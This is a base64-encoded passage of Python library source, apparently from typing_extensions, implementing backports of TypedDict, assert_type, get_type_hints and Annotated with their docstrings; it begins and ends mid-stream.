CAgICAgIHdhcm5pbmdzLndhcm4oIlBhc3NpbmcgXCdfdHlwZW5hbWVcJyBhcyBrZXl3b3JkIGFyZ3VtZW50IGlzIGRlcHJlY2F0ZWQiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICBEZXByZWNhdGlvbldhcm5pbmcsIHN0YWNrbGV2ZWw9MilcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiVHlwZWREaWN0Ll9fbmV3X18oKSBtaXNzaW5nIDEgcmVxdWlyZWQgcG9zaXRpb25hbCAiXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgImFyZ3VtZW50OiBcJ190eXBlbmFtZVwnIilcbiAgICAgICAgaWYgYXJnczpcbiAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICBmaWVsZHMsID0gYXJncyAgIyBhbGxvdyB0aGUgIl9maWVsZHMiIGtleXdvcmQgYmUgcGFzc2VkXG4gICAgICAgICAgICBleGNlcHQgVmFsdWVFcnJvcjpcbiAgICAgICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXCdUeXBlZERpY3QuX19uZXdfXygpIHRha2VzIGZyb20gMiB0byAzIFwnXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZcJ3Bvc2l0aW9uYWwgYXJndW1lbnRzIGJ1dCB7bGVuKGFyZ3MpICsgMn0gXCdcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCd3ZXJlIGdpdmVuXCcpXG4gICAgICAgIGVsaWYgXCdfZmllbGRzXCcgaW4ga3dhcmdzIGFuZCBsZW4oa3dhcmdzKSA9PSAxOlxuICAgICAgICAgICAgZmllbGRzID0ga3dhcmdzLnBvcChcJ19maWVsZHNcJylcbiAgICAgICAgICAgIGltcG9ydCB3YXJuaW5nc1xuICAgICAgICAgICAgd2FybmluZ3Mud2FybigiUGFzc2luZyBcJ19maWVsZHNcJyBhcyBrZXl3b3JkIGFyZ3VtZW50IGlzIGRlcHJlY2F0ZWQiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICBEZXByZWNhdGlvbldhcm5pbmcsIHN0YWNrbGV2ZWw9MilcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIGZpZWxkcyA9IE5vbmVcblxuICAgICAgICBpZiBmaWVsZHMgaXMgTm9uZTpcbiAgICAgICAgICAgIGZpZWxkcyA9IGt3YXJnc1xuICAgICAgICBlbGlmIGt3YXJnczpcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiVHlwZWREaWN0IHRha2VzIGVpdGhlciBhIGRpY3Qgb3Iga2V5d29yZCBhcmd1bWVudHMsIlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICIgYnV0IG5vdCBib3RoIilcblxuICAgICAgICBucyA9IHtcJ19fYW5ub3RhdGlvbnNfX1wnOiBkaWN0KGZpZWxkcyl9XG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgICMgU2V0dGluZyBjb3JyZWN0IG1vZHVsZSBpcyBuZWNlc3NhcnkgdG8gbWFrZSB0eXBlZCBkaWN0IGNsYXNzZXMgcGlja2xlYWJsZS5cbiAgICAgICAgICAgIG5zW1wnX19tb2R1bGVfX1wnXSA9IHN5cy5fZ2V0ZnJhbWUoMSkuZl9nbG9iYWxzLmdldChcJ19fbmFtZV9fXCcsIFwnX19tYWluX19cJylcbiAgICAgICAgZXhjZXB0IChBdHRyaWJ1dGVFcnJvciwgVmFsdWVFcnJvcik6XG4gICAgICAgICAgICBwYXNzXG5cbiAgICAgICAgcmV0dXJuIF9UeXBlZERpY3RNZXRhKHR5cGVuYW1lLCAoKSwgbnMsIHRvdGFsPXRvdGFsKVxuXG4gICAgX3R5cGVkZGljdF9uZXcuX190ZXh0X3NpZ25hdHVyZV9fID0gKFwnKCRjbHMsIF90eXBlbmFtZSwgX2ZpZWxkcz1Ob25lLFwnXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwnIC8sICosIHRvdGFsPVRydWUsICoqa3dhcmdzKVwnKVxuXG4gICAgY2xhc3MgX1R5cGVkRGljdE1ldGEodHlwZSk6XG4gICAgICAgIGRlZiBfX2luaXRfXyhjbHMsIG5hbWUsIGJhc2VzLCBucywgdG90YWw9VHJ1ZSk6XG4gICAgICAgICAgICBzdXBlcigpLl9faW5pdF9fKG5hbWUsIGJhc2VzLCBucylcblxuICAgICAgICBkZWYgX19uZXdfXyhjbHMsIG5hbWUsIGJhc2VzLCBucywgdG90YWw9VHJ1ZSk6XG4gICAgICAgICAgICAjIENyZWF0ZSBuZXcgdHlwZWQgZGljdCBjbGFzcyBvYmplY3QuXG4gICAgICAgICAgICAjIFRoaXMgbWV0aG9kIGlzIGNhbGxlZCBkaXJlY3RseSB3aGVuIFR5cGVkRGljdCBpcyBzdWJjbGFzc2VkLFxuICAgICAgICAgICAgIyBvciB2aWEgX3R5cGVkZGljdF9uZXcgd2hlbiBUeXBlZERpY3QgaXMgaW5zdGFudGlhdGVkLiBUaGlzIHdheVxuICAgICAgICAgICAgIyBUeXBlZERpY3Qgc3VwcG9ydHMgYWxsIHRocmVlIHN5bnRheGVzIGRlc2NyaWJlZCBpbiBpdHMgZG9jc3RyaW5nLlxuICAgICAgICAgICAgIyBTdWJjbGFzc2VzIGFuZCBpbnN0YW5jZXMgb2YgVHlwZWREaWN0IHJldHVybiBhY3R1YWwgZGljdGlvbmFyaWVzXG4gICAgICAgICAgICAjIHZpYSBfZGljdF9uZXcuXG4gICAgICAgICAgICBuc1tcJ19fbmV3X19cJ10gPSBfdHlwZWRkaWN0X25ldyBpZiBuYW1lID09IFwnVHlwZWREaWN0XCcgZWxzZSBfZGljdF9uZXdcbiAgICAgICAgICAgIHRwX2RpY3QgPSBzdXBlcigpLl9fbmV3X18oY2xzLCBuYW1lLCAoZGljdCwpLCBucylcblxuICAgICAgICAgICAgYW5ub3RhdGlvbnMgPSB7fVxuICAgICAgICAgICAgb3duX2Fubm90YXRpb25zID0gbnMuZ2V0KFwnX19hbm5vdGF0aW9uc19fXCcsIHt9KVxuICAgICAgICAgICAgbXNnID0gIlR5cGVkRGljdChcJ05hbWVcJywge2YwOiB0MCwgZjE6IHQxLCAuLi59KTsgZWFjaCB0IG11c3QgYmUgYSB0eXBlIlxuICAgICAgICAgICAgb3duX2Fubm90YXRpb25zID0ge1xuICAgICAgICAgICAgICAgIG46IHR5cGluZy5fdHlwZV9jaGVjayh0cCwgbXNnKSBmb3IgbiwgdHAgaW4gb3duX2Fubm90YXRpb25zLml0ZW1zKClcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHJlcXVpcmVkX2tleXMgPSBzZXQoKVxuICAgICAgICAgICAgb3B0aW9uYWxfa2V5cyA9IHNldCgpXG5cbiAgICAgICAgICAgIGZvciBiYXNlIGluIGJhc2VzOlxuICAgICAgICAgICAgICAgIGFubm90YXRpb25zLnVwZGF0ZShiYXNlLl9fZGljdF9fLmdldChcJ19fYW5ub3RhdGlvbnNfX1wnLCB7fSkpXG4gICAgICAgICAgICAgICAgcmVxdWlyZWRfa2V5cy51cGRhdGUoYmFzZS5fX2RpY3RfXy5nZXQoXCdfX3JlcXVpcmVkX2tleXNfX1wnLCAoKSkpXG4gICAgICAgICAgICAgICAgb3B0aW9uYWxfa2V5cy51cGRhdGUoYmFzZS5fX2RpY3RfXy5nZXQoXCdfX29wdGlvbmFsX2tleXNfX1wnLCAoKSkpXG5cbiAgICAgICAgICAgIGFubm90YXRpb25zLnVwZGF0ZShvd25fYW5ub3RhdGlvbnMpXG4gICAgICAgICAgICBmb3IgYW5ub3RhdGlvbl9rZXksIGFubm90YXRpb25fdHlwZSBpbiBvd25fYW5ub3RhdGlvbnMuaXRlbXMoKTpcbiAgICAgICAgICAgICAgICBhbm5vdGF0aW9uX29yaWdpbiA9IGdldF9vcmlnaW4oYW5ub3RhdGlvbl90eXBlKVxuICAgICAgICAgICAgICAgIGlmIGFubm90YXRpb25fb3JpZ2luIGlzIEFubm90YXRlZDpcbiAgICAgICAgICAgICAgICAgICAgYW5ub3RhdGlvbl9hcmdzID0gZ2V0X2FyZ3MoYW5ub3RhdGlvbl90eXBlKVxuICAgICAgICAgICAgICAgICAgICBpZiBhbm5vdGF0aW9uX2FyZ3M6XG4gICAgICAgICAgICAgICAgICAgICAgICBhbm5vdGF0aW9uX3R5cGUgPSBhbm5vdGF0aW9uX2FyZ3NbMF1cbiAgICAgICAgICAgICAgICAgICAgICAgIGFubm90YXRpb25fb3JpZ2luID0gZ2V0X29yaWdpbihhbm5vdGF0aW9uX3R5cGUpXG5cbiAgICAgICAgICAgICAgICBpZiBhbm5vdGF0aW9uX29yaWdpbiBpcyBSZXF1aXJlZDpcbiAgICAgICAgICAgICAgICAgICAgcmVxdWlyZWRfa2V5cy5hZGQoYW5ub3RhdGlvbl9rZXkpXG4gICAgICAgICAgICAgICAgZWxpZiBhbm5vdGF0aW9uX29yaWdpbiBpcyBOb3RSZXF1aXJlZDpcbiAgICAgICAgICAgICAgICAgICAgb3B0aW9uYWxfa2V5cy5hZGQoYW5ub3RhdGlvbl9rZXkpXG4gICAgICAgICAgICAgICAgZWxpZiB0b3RhbDpcbiAgICAgICAgICAgICAgICAgICAgcmVxdWlyZWRfa2V5cy5hZGQoYW5ub3RhdGlvbl9rZXkpXG4gICAgICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICAgICAgb3B0aW9uYWxfa2V5cy5hZGQoYW5ub3RhdGlvbl9rZXkpXG5cbiAgICAgICAgICAgIHRwX2RpY3QuX19hbm5vdGF0aW9uc19fID0gYW5ub3RhdGlvbnNcbiAgICAgICAgICAgIHRwX2RpY3QuX19yZXF1aXJlZF9rZXlzX18gPSBmcm96ZW5zZXQocmVxdWlyZWRfa2V5cylcbiAgICAgICAgICAgIHRwX2RpY3QuX19vcHRpb25hbF9rZXlzX18gPSBmcm96ZW5zZXQob3B0aW9uYWxfa2V5cylcbiAgICAgICAgICAgIGlmIG5vdCBoYXNhdHRyKHRwX2RpY3QsIFwnX190b3RhbF9fXCcpOlxuICAgICAgICAgICAgICAgIHRwX2RpY3QuX190b3RhbF9fID0gdG90YWxcbiAgICAgICAgICAgIHJldHVybiB0cF9kaWN0XG5cbiAgICAgICAgX19pbnN0YW5jZWNoZWNrX18gPSBfX3N1YmNsYXNzY2hlY2tfXyA9IF9jaGVja19mYWlsc1xuXG4gICAgVHlwZWREaWN0ID0gX1R5cGVkRGljdE1ldGEoXCdUeXBlZERpY3RcJywgKGRpY3QsKSwge30pXG4gICAgVHlwZWREaWN0Ll9fbW9kdWxlX18gPSBfX25hbWVfX1xuICAgIFR5cGVkRGljdC5fX2RvY19fID0gXFxcbiAgICAgICAgIiIiQSBzaW1wbGUgdHlwZWQgbmFtZSBzcGFjZS4gQXQgcnVudGltZSBpdCBpcyBlcXVpdmFsZW50IHRvIGEgcGxhaW4gZGljdC5cblxuICAgICAgICBUeXBlZERpY3QgY3JlYXRlcyBhIGRpY3Rpb25hcnkgdHlwZSB0aGF0IGV4cGVjdHMgYWxsIG9mIGl0c1xuICAgICAgICBpbnN0YW5jZXMgdG8gaGF2ZSBhIGNlcnRhaW4gc2V0IG9mIGtleXMsIHdpdGggZWFjaCBrZXlcbiAgICAgICAgYXNzb2NpYXRlZCB3aXRoIGEgdmFsdWUgb2YgYSBjb25zaXN0ZW50IHR5cGUuIFRoaXMgZXhwZWN0YXRpb25cbiAgICAgICAgaXMgbm90IGNoZWNrZWQgYXQgcnVudGltZSBidXQgaXMgb25seSBlbmZvcmNlZCBieSB0eXBlIGNoZWNrZXJzLlxuICAgICAgICBVc2FnZTo6XG5cbiAgICAgICAgICAgIGNsYXNzIFBvaW50MkQoVHlwZWREaWN0KTpcbiAgICAgICAgICAgICAgICB4OiBpbnRcbiAgICAgICAgICAgICAgICB5OiBpbnRcbiAgICAgICAgICAgICAgICBsYWJlbDogc3RyXG5cbiAgICAgICAgICAgIGE6IFBvaW50MkQgPSB7XCd4XCc6IDEsIFwneVwnOiAyLCBcJ2xhYmVsXCc6IFwnZ29vZFwnfSAgIyBPS1xuICAgICAgICAgICAgYjogUG9pbnQyRCA9IHtcJ3pcJzogMywgXCdsYWJlbFwnOiBcJ2JhZFwnfSAgICAgICAgICAgIyBGYWlscyB0eXBlIGNoZWNrXG5cbiAgICAgICAgICAgIGFzc2VydCBQb2ludDJEKHg9MSwgeT0yLCBsYWJlbD1cJ2ZpcnN0XCcpID09IGRpY3QoeD0xLCB5PTIsIGxhYmVsPVwnZmlyc3RcJylcblxuICAgICAgICBUaGUgdHlwZSBpbmZvIGNhbiBiZSBhY2Nlc3NlZCB2aWEgdGhlIFBvaW50MkQuX19hbm5vdGF0aW9uc19fIGRpY3QsIGFuZFxuICAgICAgICB0aGUgUG9pbnQyRC5fX3JlcXVpcmVkX2tleXNfXyBhbmQgUG9pbnQyRC5fX29wdGlvbmFsX2tleXNfXyBmcm96ZW5zZXRzLlxuICAgICAgICBUeXBlZERpY3Qgc3VwcG9ydHMgdHdvIGFkZGl0aW9uYWwgZXF1aXZhbGVudCBmb3Jtczo6XG5cbiAgICAgICAgICAgIFBvaW50MkQgPSBUeXBlZERpY3QoXCdQb2ludDJEXCcsIHg9aW50LCB5PWludCwgbGFiZWw9c3RyKVxuICAgICAgICAgICAgUG9pbnQyRCA9IFR5cGVkRGljdChcJ1BvaW50MkRcJywge1wneFwnOiBpbnQsIFwneVwnOiBpbnQsIFwnbGFiZWxcJzogc3RyfSlcblxuICAgICAgICBUaGUgY2xhc3Mgc3ludGF4IGlzIG9ubHkgc3VwcG9ydGVkIGluIFB5dGhvbiAzLjYrLCB3aGlsZSB0d28gb3RoZXJcbiAgICAgICAgc3ludGF4IGZvcm1zIHdvcmsgZm9yIFB5dGhvbiAyLjcgYW5kIDMuMitcbiAgICAgICAgIiIiXG5cbiAgICBpZiBoYXNhdHRyKHR5cGluZywgIl9UeXBlZERpY3RNZXRhIik6XG4gICAgICAgIF9UWVBFRERJQ1RfVFlQRVMgPSAodHlwaW5nLl9UeXBlZERpY3RNZXRhLCBfVHlwZWREaWN0TWV0YSlcbiAgICBlbHNlOlxuICAgICAgICBfVFlQRURESUNUX1RZUEVTID0gKF9UeXBlZERpY3RNZXRhLClcblxuICAgIGRlZiBpc190eXBlZGRpY3QodHApOlxuICAgICAgICAiIiJDaGVjayBpZiBhbiBhbm5vdGF0aW9uIGlzIGEgVHlwZWREaWN0IGNsYXNzXG5cbiAgICAgICAgRm9yIGV4YW1wbGU6OlxuICAgICAgICAgICAgY2xhc3MgRmlsbShUeXBlZERpY3QpOlxuICAgICAgICAgICAgICAgIHRpdGxlOiBzdHJcbiAgICAgICAgICAgICAgICB5ZWFyOiBpbnRcblxuICAgICAgICAgICAgaXNfdHlwZWRkaWN0KEZpbG0pICAjID0+IFRydWVcbiAgICAgICAgICAgIGlzX3R5cGVkZGljdChVbmlvbltsaXN0LCBzdHJdKSAgIyA9PiBGYWxzZVxuICAgICAgICAiIiJcbiAgICAgICAgcmV0dXJuIGlzaW5zdGFuY2UodHAsIHR1cGxlKF9UWVBFRERJQ1RfVFlQRVMpKVxuXG5cbmlmIGhhc2F0dHIodHlwaW5nLCAiYXNzZXJ0X3R5cGUiKTpcbiAgICBhc3NlcnRfdHlwZSA9IHR5cGluZy5hc3NlcnRfdHlwZVxuXG5lbHNlOlxuICAgIGRlZiBhc3NlcnRfdHlwZShfX3ZhbCwgX190eXApOlxuICAgICAgICAiIiJBc3NlcnQgKHRvIHRoZSB0eXBlIGNoZWNrZXIpIHRoYXQgdGhlIHZhbHVlIGlzIG9mIHRoZSBnaXZlbiB0eXBlLlxuXG4gICAgICAgIFdoZW4gdGhlIHR5cGUgY2hlY2tlciBlbmNvdW50ZXJzIGEgY2FsbCB0byBhc3NlcnRfdHlwZSgpLCBpdFxuICAgICAgICBlbWl0cyBhbiBlcnJvciBpZiB0aGUgdmFsdWUgaXMgbm90IG9mIHRoZSBzcGVjaWZpZWQgdHlwZTo6XG5cbiAgICAgICAgICAgIGRlZiBncmVldChuYW1lOiBzdHIpIC0+IE5vbmU6XG4gICAgICAgICAgICAgICAgYXNzZXJ0X3R5cGUobmFtZSwgc3RyKSAgIyBva1xuICAgICAgICAgICAgICAgIGFzc2VydF90eXBlKG5hbWUsIGludCkgICMgdHlwZSBjaGVja2VyIGVycm9yXG5cbiAgICAgICAgQXQgcnVudGltZSB0aGlzIHJldHVybnMgdGhlIGZpcnN0IGFyZ3VtZW50IHVuY2hhbmdlZCBhbmQgb3RoZXJ3aXNlXG4gICAgICAgIGRvZXMgbm90aGluZy5cbiAgICAgICAgIiIiXG4gICAgICAgIHJldHVybiBfX3ZhbFxuXG5cbmlmIGhhc2F0dHIodHlwaW5nLCAiUmVxdWlyZWQiKTpcbiAgICBnZXRfdHlwZV9oaW50cyA9IHR5cGluZy5nZXRfdHlwZV9oaW50c1xuZWxzZTpcbiAgICBpbXBvcnQgZnVuY3Rvb2xzXG4gICAgaW1wb3J0IHR5cGVzXG5cbiAgICAjIHJlcGxhY2VzIF9zdHJpcF9hbm5vdGF0aW9ucygpXG4gICAgZGVmIF9zdHJpcF9leHRyYXModCk6XG4gICAgICAgICIiIlN0cmlwcyBBbm5vdGF0ZWQsIFJlcXVpcmVkIGFuZCBOb3RSZXF1aXJlZCBmcm9tIGEgZ2l2ZW4gdHlwZS4iIiJcbiAgICAgICAgaWYgaXNpbnN0YW5jZSh0LCBfQW5ub3RhdGVkQWxpYXMpOlxuICAgICAgICAgICAgcmV0dXJuIF9zdHJpcF9leHRyYXModC5fX29yaWdpbl9fKVxuICAgICAgICBpZiBoYXNhdHRyKHQsICJfX29yaWdpbl9fIikgYW5kIHQuX19vcmlnaW5fXyBpbiAoUmVxdWlyZWQsIE5vdFJlcXVpcmVkKTpcbiAgICAgICAgICAgIHJldHVybiBfc3RyaXBfZXh0cmFzKHQuX19hcmdzX19bMF0pXG4gICAgICAgIGlmIGlzaW5zdGFuY2UodCwgdHlwaW5nLl9HZW5lcmljQWxpYXMpOlxuICAgICAgICAgICAgc3RyaXBwZWRfYXJncyA9IHR1cGxlKF9zdHJpcF9leHRyYXMoYSkgZm9yIGEgaW4gdC5fX2FyZ3NfXylcbiAgICAgICAgICAgIGlmIHN0cmlwcGVkX2FyZ3MgPT0gdC5fX2FyZ3NfXzpcbiAgICAgICAgICAgICAgICByZXR1cm4gdFxuICAgICAgICAgICAgcmV0dXJuIHQuY29weV93aXRoKHN0cmlwcGVkX2FyZ3MpXG4gICAgICAgIGlmIGhhc2F0dHIodHlwZXMsICJHZW5lcmljQWxpYXMiKSBhbmQgaXNpbnN0YW5jZSh0LCB0eXBlcy5HZW5lcmljQWxpYXMpOlxuICAgICAgICAgICAgc3RyaXBwZWRfYXJncyA9IHR1cGxlKF9zdHJpcF9leHRyYXMoYSkgZm9yIGEgaW4gdC5fX2FyZ3NfXylcbiAgICAgICAgICAgIGlmIHN0cmlwcGVkX2FyZ3MgPT0gdC5fX2FyZ3NfXzpcbiAgICAgICAgICAgICAgICByZXR1cm4gdFxuICAgICAgICAgICAgcmV0dXJuIHR5cGVzLkdlbmVyaWNBbGlhcyh0Ll9fb3JpZ2luX18sIHN0cmlwcGVkX2FyZ3MpXG4gICAgICAgIGlmIGhhc2F0dHIodHlwZXMsICJVbmlvblR5cGUiKSBhbmQgaXNpbnN0YW5jZSh0LCB0eXBlcy5VbmlvblR5cGUpOlxuICAgICAgICAgICAgc3RyaXBwZWRfYXJncyA9IHR1cGxlKF9zdHJpcF9leHRyYXMoYSkgZm9yIGEgaW4gdC5fX2FyZ3NfXylcbiAgICAgICAgICAgIGlmIHN0cmlwcGVkX2FyZ3MgPT0gdC5fX2FyZ3NfXzpcbiAgICAgICAgICAgICAgICByZXR1cm4gdFxuICAgICAgICAgICAgcmV0dXJuIGZ1bmN0b29scy5yZWR1Y2Uob3BlcmF0b3Iub3JfLCBzdHJpcHBlZF9hcmdzKVxuXG4gICAgICAgIHJldHVybiB0XG5cbiAgICBkZWYgZ2V0X3R5cGVfaGludHMob2JqLCBnbG9iYWxucz1Ob25lLCBsb2NhbG5zPU5vbmUsIGluY2x1ZGVfZXh0cmFzPUZhbHNlKTpcbiAgICAgICAgIiIiUmV0dXJuIHR5cGUgaGludHMgZm9yIGFuIG9iamVjdC5cblxuICAgICAgICBUaGlzIGlzIG9mdGVuIHRoZSBzYW1lIGFzIG9iai5fX2Fubm90YXRpb25zX18sIGJ1dCBpdCBoYW5kbGVzXG4gICAgICAgIGZvcndhcmQgcmVmZXJlbmNlcyBlbmNvZGVkIGFzIHN0cmluZyBsaXRlcmFscywgYWRkcyBPcHRpb25hbFt0XSBpZiBhXG4gICAgICAgIGRlZmF1bHQgdmFsdWUgZXF1YWwgdG8gTm9uZSBpcyBzZXQgYW5kIHJlY3Vyc2l2ZWx5IHJlcGxhY2VzIGFsbFxuICAgICAgICBcJ0Fubm90YXRlZFtULCAuLi5dXCcsIFwnUmVxdWlyZWRbVF1cJyBvciBcJ05vdFJlcXVpcmVkW1RdXCcgd2l0aCBcJ1RcJ1xuICAgICAgICAodW5sZXNzIFwnaW5jbHVkZV9leHRyYXM9VHJ1ZVwnKS5cblxuICAgICAgICBUaGUgYXJndW1lbnQgbWF5IGJlIGEgbW9kdWxlLCBjbGFzcywgbWV0aG9kLCBvciBmdW5jdGlvbi4gVGhlIGFubm90YXRpb25zXG4gICAgICAgIGFyZSByZXR1cm5lZCBhcyBhIGRpY3Rpb25hcnkuIEZvciBjbGFzc2VzLCBhbm5vdGF0aW9ucyBpbmNsdWRlIGFsc29cbiAgICAgICAgaW5oZXJpdGVkIG1lbWJlcnMuXG5cbiAgICAgICAgVHlwZUVycm9yIGlzIHJhaXNlZCBpZiB0aGUgYXJndW1lbnQgaXMgbm90IG9mIGEgdHlwZSB0aGF0IGNhbiBjb250YWluXG4gICAgICAgIGFubm90YXRpb25zLCBhbmQgYW4gZW1wdHkgZGljdGlvbmFyeSBpcyByZXR1cm5lZCBpZiBubyBhbm5vdGF0aW9ucyBhcmVcbiAgICAgICAgcHJlc2VudC5cblxuICAgICAgICBCRVdBUkUgLS0gdGhlIGJlaGF2aW9yIG9mIGdsb2JhbG5zIGFuZCBsb2NhbG5zIGlzIGNvdW50ZXJpbnR1aXRpdmVcbiAgICAgICAgKHVubGVzcyB5b3UgYXJlIGZhbWlsaWFyIHdpdGggaG93IGV2YWwoKSBhbmQgZXhlYygpIHdvcmspLiAgVGhlXG4gICAgICAgIHNlYXJjaCBvcmRlciBpcyBsb2NhbHMgZmlyc3QsIHRoZW4gZ2xvYmFscy5cblxuICAgICAgICAtIElmIG5vIGRpY3QgYXJndW1lbnRzIGFyZSBwYXNzZWQsIGFuIGF0dGVtcHQgaXMgbWFkZSB0byB1c2UgdGhlXG4gICAgICAgICAgZ2xvYmFscyBmcm9tIG9iaiAob3IgdGhlIHJlc3BlY3RpdmUgbW9kdWxlXCdzIGdsb2JhbHMgZm9yIGNsYXNzZXMpLFxuICAgICAgICAgIGFuZCB0aGVzZSBhcmUgYWxzbyB1c2VkIGFzIHRoZSBsb2NhbHMuICBJZiB0aGUgb2JqZWN0IGRvZXMgbm90IGFwcGVhclxuICAgICAgICAgIHRvIGhhdmUgZ2xvYmFscywgYW4gZW1wdHkgZGljdGlvbmFyeSBpcyB1c2VkLlxuXG4gICAgICAgIC0gSWYgb25lIGRpY3QgYXJndW1lbnQgaXMgcGFzc2VkLCBpdCBpcyB1c2VkIGZvciBib3RoIGdsb2JhbHMgYW5kXG4gICAgICAgICAgbG9jYWxzLlxuXG4gICAgICAgIC0gSWYgdHdvIGRpY3QgYXJndW1lbnRzIGFyZSBwYXNzZWQsIHRoZXkgc3BlY2lmeSBnbG9iYWxzIGFuZFxuICAgICAgICAgIGxvY2FscywgcmVzcGVjdGl2ZWx5LlxuICAgICAgICAiIiJcbiAgICAgICAgaWYgaGFzYXR0cih0eXBpbmcsICJBbm5vdGF0ZWQiKTpcbiAgICAgICAgICAgIGhpbnQgPSB0eXBpbmcuZ2V0X3R5cGVfaGludHMoXG4gICAgICAgICAgICAgICAgb2JqLCBnbG9iYWxucz1nbG9iYWxucywgbG9jYWxucz1sb2NhbG5zLCBpbmNsdWRlX2V4dHJhcz1UcnVlXG4gICAgICAgICAgICApXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICBoaW50ID0gdHlwaW5nLmdldF90eXBlX2hpbnRzKG9iaiwgZ2xvYmFsbnM9Z2xvYmFsbnMsIGxvY2FsbnM9bG9jYWxucylcbiAgICAgICAgaWYgaW5jbHVkZV9leHRyYXM6XG4gICAgICAgICAgICByZXR1cm4gaGludFxuICAgICAgICByZXR1cm4ge2s6IF9zdHJpcF9leHRyYXModCkgZm9yIGssIHQgaW4gaGludC5pdGVtcygpfVxuXG5cbiMgUHl0aG9uIDMuOSsgaGFzIFBFUCA1OTMgKEFubm90YXRlZClcbmlmIGhhc2F0dHIodHlwaW5nLCBcJ0Fubm90YXRlZFwnKTpcbiAgICBBbm5vdGF0ZWQgPSB0eXBpbmcuQW5ub3RhdGVkXG4gICAgIyBOb3QgZXhwb3J0ZWQgYW5kIG5vdCBhIHB1YmxpYyBBUEksIGJ1dCBuZWVkZWQgZm9yIGdldF9vcmlnaW4oKSBhbmQgZ2V0X2FyZ3MoKVxuICAgICMgdG8gd29yay5cbiAgICBfQW5ub3RhdGVkQWxpYXMgPSB0eXBpbmcuX0Fubm90YXRlZEFsaWFzXG4jIDMuNy0zLjhcbmVsc2U6XG4gICAgY2xhc3MgX0Fubm90YXRlZEFsaWFzKHR5cGluZy5fR2VuZXJpY0FsaWFzLCBfcm9vdD1UcnVlKTpcbiAgICAgICAgIiIiUnVudGltZSByZXByZXNlbnRhdGlvbiBvZiBhbiBhbm5vdGF0ZWQgdHlwZS5cblxuICAgICAgICBBdCBpdHMgY29yZSBcJ0Fubm90YXRlZFt0LCBkZWMxLCBkZWMyLCAuLi5dXCcgaXMgYW4gYWxpYXMgZm9yIHRoZSB0eXBlIFwndFwnXG4gICAgICAgIHdpdGggZXh0cmEgYW5ub3RhdGlvbnMuIFRoZSBhbGlhcyBiZWhhdmVzIGxpa2UgYSBub3JtYWwgdHlwaW5nIGFsaWFzLFxuICAgICAgICBpbnN0YW50aWF0aW5nIGlzIHRoZSBzYW1lIGFzIGluc3RhbnRpYXRpbmcgdGhlIHVuZGVybHlpbmcgdHlwZSwgYmluZGluZ1xuICAgICAgICBpdCB0byB0eXBlcyBpcyBhbHNvIHRoZSBzYW1lLlxuICAgICAgICAiIiJcbiAgICAgICAgZGVmIF9faW5pdF9fKHNlbGYsIG9yaWdpbiwgbWV0YWRhdGEpOlxuICAgICAgICAgICAgaWYgaXNpbnN0YW5jZShvcmlnaW4sIF9Bbm5vdGF0ZWRBbGlhcyk6XG4gICAgICAgICAgICAgICAgbWV0YWRhdGEgPSBvcmlnaW4uX19tZXRhZGF0YV9fICsgbWV0YWRhdGFcbiAgICAgICAgICAgICAgICBvcmlnaW4gPSBvcmlnaW4uX19vcmlnaW5fX1xuICAgICAgICAgICAgc3VwZXIoKS5fX2luaXRfXyhvcmlnaW4sIG9yaWdpbilcbiAgICAgICAgICAgIHNlbGYuX19tZXRhZGF0YV9fID0gbWV0YWRhdGFcblxuICAgICAgICBkZWYgY29weV93aXRoKHNlbGYsIHBhcmFtcyk6XG4gICAgICAgICAgICBhc3NlcnQgbGVuKHBhcmFtcykgPT0gMVxuICAgICAgICAgICAgbmV3X3R5cGUgPSBwYXJhbXNbMF1cbiAgICAgICAgICAgIHJldHVybiBfQW5ub3RhdGVkQWxpYXMobmV3X3R5cGUsIHNlbGYuX19tZXRhZGF0YV9fKVxuXG4gICAgICAgIGRlZiBfX3JlcHJfXyhzZWxmKTpcbiAgICAgICAgICAgIHJldHVybiAoZiJ0eXBpbmdfZXh0ZW5zaW9ucy5Bbm5vdGF0ZWRbe3R5cGluZy5fdHlwZV9yZXByKHNlbGYuX19vcmlnaW5fXyl9LCAiXG4gICAgICAgICAgICAgICAgICAgIGYie1wnLCBcJy5qb2luKHJlcHIoYSkgZm9yIGEgaW4gc2VsZi5fX21ldGFkYXRhX18pfV0iKVxuXG4gICAgICAgIGRlZiBfX3JlZHVjZV9fKHNlbGYpOlxuICAgICAgICAgICAgcmV0dXJuIG9wZXJhdG9yLmdldGl0ZW0sIChcbiAgICAgICAgICAgICAgICBBbm5vdGF0ZWQsIChzZWxmLl9fb3JpZ2luX18sKSArIHNlbGYuX19tZXRhZGF0YV9fXG4gICAgICAgICAgICApXG5cbiAgICAgICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcik6XG4gICAgICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgX0Fubm90YXRlZEFsaWFzKTpcbiAgICAgICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcbiAgICAgICAgICAgIGlmIHNlbGYuX19vcmlnaW5fXyAhPSBvdGhlci5fX29yaWdpbl9fOlxuICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZVxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX19tZXRhZGF0YV9fID09IG90aGVyLl9fbWV0YWRhdGFfX1xuXG4gICAgICAgIGRlZiBfX2hhc2hfXyhzZWxmKTpcbiAgICAgICAgICAgIHJldHVybiBoYXNoKChzZWxmLl9fb3JpZ2luX18sIHNlbGYuX19tZXRhZGF0YV9fKSlcblxuICAgIGNsYXNzIEFubm90YXRlZDpcbiAgICAgICAgIiIiQWRkIGNvbnRleHQgc3BlY2lmaWMgbWV0YWRhdGEgdG8gYSB0eXBlLlxuXG4gICAgICAgIEV4